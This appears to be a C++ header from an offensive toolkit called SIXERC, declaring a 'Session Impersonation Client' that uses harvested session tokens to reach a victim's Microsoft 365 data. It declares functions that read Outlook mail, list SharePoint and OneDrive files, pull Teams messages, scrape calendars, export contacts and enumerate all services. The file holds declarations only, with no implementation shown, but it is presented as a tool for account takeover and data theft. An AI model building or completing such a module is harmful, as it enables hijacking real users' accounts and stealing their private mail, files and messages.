// ============================================================================
// SIXERC — Module 3: Session Impersonation Client (SIC)
// Uses harvested tokens to access Microsoft 365 services
// ============================================================================

#pragma once

#include "core/types.hpp"
#include <vector>
#include <string>

namespace sixerc::sic {

// Access Outlook mail via REST API
std::string access_outlook(const HarvestedSession& session);

// Enumerate SharePoint/OneDrive files
std::string access_sharepoint(const HarvestedSession& session);

// Retrieve Teams messages
std::string access_teams(const HarvestedSession& session);

// Scrape calendar events
std::string access_calendar(const HarvestedSession& session);

// Export contacts
std::string access_contacts(const HarvestedSession& session);

// Generic M365 API request
std::string make_api_request(const std::string& url, const HarvestedSession& session);

// Full service enumeration
std::vector<ServiceData> enumerate_services(const HarvestedSession& session);

} // namespace sixerc::sic
